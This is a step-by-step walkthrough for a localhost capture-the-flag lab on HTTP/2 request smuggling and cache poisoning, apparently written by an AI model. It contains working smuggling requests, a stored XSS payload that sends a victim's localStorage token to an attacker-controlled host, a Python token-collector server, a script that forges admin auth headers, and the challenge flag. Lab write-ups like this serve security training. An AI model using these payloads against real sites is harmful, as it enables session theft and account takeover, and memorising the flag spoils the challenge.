# HTTP Smuggling + Cache Poisoning CTF Walkthrough

## Prerequisites
- Burp Suite Professional (Community Edition won't work as it doesn't support HTTP/2)
- Python installed
- A web browser (Chrome/Firefox)
- Basic understanding of HTTP

## Step 1: Initial Reconnaissance

1. Visit the website (http://localhost or https://localhost)
   - You'll see a landing page with User and Admin login options
   - We're interested in getting admin access

2. Create a normal user account first:
```http
POST /api/auth/login
Content-Type: application/json

{
    "username": "testuser",
    "password": "testpass123"
}
```

3. Open Burp Suite and examine the site structure:
- Turn on Burp proxy
- Browse through the site
- Notice interesting endpoints:
  - /api/blog/post (POST)
  - /api/blog/report (POST)
  - /api/admin/dashboard (GET)

## Step 2: Identifying the HTTP Smuggling Vulnerability

1. Open Burp Suite Repeater:
   - Click 'New Repeater Tab'
   - Change request type to HTTP/2 (Click the "HTTP/1" button to toggle)

2. Test for HTTP Request Smuggling:
```http
POST /api/blog/post HTTP/2
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Transfer-Encoding: chunked

0

POST /api/blog/post HTTP/1.1
Host: localhost
Content-Length: 5

x=1
```

3. Look for signs of smuggling:
   - Multiple responses
   - Error messages
   - Delayed responses

## Step 3: Testing Cache Poisoning

1. Create a simple test payload:
```http
POST /api/blog/post HTTP/2
Host: localhost
Content-Type: application/json
Content-Length: 250
Transfer-Encoding: chunked

0

GET /api/blog/1 HTTP/1.1
Host: localhost
Content-Length: 200

{"title": "Test", "content": "<script>alert(1)</script>"}
```

2. Verify cache behavior:
   - Send the request multiple times
   - Try accessing the blog post directly
   - Look for X-Cache headers in response

## Step 4: Setting Up Token Collector

1. Create collector.py:
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class TokenCollector(BaseHTTPRequestHandler):
    def do_GET(self):
        # Print any received data
        print("\n=== Received Request ===")
        print(f"Path: {self.path}")
        print("======================")
        
        # Send OK response
        self.send_response(200)
        self.end_headers()

print("Starting collector on port 8000...")
HTTPServer(('0.0.0.0', 8000), TokenCollector).serve_forever()
```

2. Run the collector:
```bash
python collector.py
```

## Step 5: Crafting the XSS Payload

1. Create the malicious payload:
```http
POST /api/blog/post HTTP/2
Host: localhost
Content-Type: application/json
Content-Length: 350
Transfer-Encoding: chunked

0

POST /api/blog/post HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 250

{
    "title": "Normal Looking Post",
    "content": "<script>fetch('http://YOUR-IP:8000/steal?' + encodeURIComponent(localStorage.getItem('token')))</script>Welcome to my blog post!"
}
```

2. Send this request multiple times in Burp Repeater to ensure it's cached

3. Verify the post exists and contains your XSS:
```http
GET /api/blog/posts HTTP/2
Host: localhost
```

## Step 6: Triggering Admin Visit

1. Report the poisoned post:
```http
POST /api/blog/report HTTP/2
Host: localhost
Content-Type: application/json
Authorization: Bearer YOUR_USER_TOKEN

{
    "postId": "1"
}
```

2. Watch your collector terminal for the admin's token

## Step 7: Generating X-Service-Auth

1. Create gen_auth.py:
```python
import hashlib
import time
import sys

def generate_auth(token):
    timestamp = int(time.time())
    secret = "very_secret_key_456"
    raw = f"{token}{timestamp}{secret}"
    auth = hashlib.md5(raw.encode()).hexdigest()
    return auth, timestamp

if len(sys.argv) != 2:
    print("Usage: python gen_auth.py <admin_token>")
    sys.exit(1)

auth, timestamp = generate_auth(sys.argv[1])
print(f"X-Service-Auth: {auth}")
print(f"X-Timestamp: {timestamp}")
```

2. Generate the headers:
```bash
python gen_auth.py "STOLEN_ADMIN_TOKEN"
```

## Step 8: Accessing Admin Dashboard

1. In Burp Repeater, create new request:
```http
GET /api/admin/dashboard HTTP/2
Host: localhost
Authorization: Bearer STOLEN_ADMIN_TOKEN
X-Service-Auth: GENERATED_AUTH
X-Timestamp: TIMESTAMP
```

2. Send the request to get the flag

## Common Issues & Tips

1. If XSS doesn't execute:
   - Check browser console for errors
   - Ensure your collector IP is accessible
   - Try different payload encodings

2. If cache poisoning fails:
   - Send request multiple times
   - Verify cache headers
   - Try different Content-Length values

3. If admin doesn't visit:
   - Check report endpoint response
   - Verify post ID exists
   - Watch admin bot logs

4. If auth generation fails:
   - Double check token format
   - Ensure timestamp is current
   - Verify secret key value

## Tools Reference

1. Burp Suite Professional:
   - Proxy: Intercept and modify requests
   - Repeater: Send and modify requests
   - HTTP/2: Toggle between HTTP versions

2. Python Scripts:
   - collector.py: Capture stolen tokens
   - gen_auth.py: Generate auth headers

3. Browser DevTools:
   - Console: Check for JavaScript errors
   - Network: Monitor requests
   - Application: Inspect localStorage

The flag format is: flag{http2_smuggl1ng_w1th_c4ch3_p01s0n}

Would you like me to:
1. Add more detailed explanations of any steps?
2. Include additional troubleshooting tips?
3. Add alternative attack methods?